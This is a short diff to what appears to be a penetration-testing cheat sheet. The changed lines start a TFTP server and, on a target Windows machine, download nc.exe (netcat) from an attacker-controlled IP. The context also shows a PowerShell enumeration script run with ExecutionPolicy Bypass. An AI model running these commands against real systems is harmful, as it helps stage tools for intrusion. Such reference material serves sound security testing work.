@@ -387,13 +387,13 @@ C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
 
 <h4>TFTP</h4> 
 
-Local
+Local (start the service)
 
     atftpd --daemon --port 69 /tftp
 
 Remote
 
-    tftp -i 10.11.0.99 get nc.exe
+    tftp -i 10.10.10.10 get nc.exe
 
 
 <h4>Windows FTP </h4>
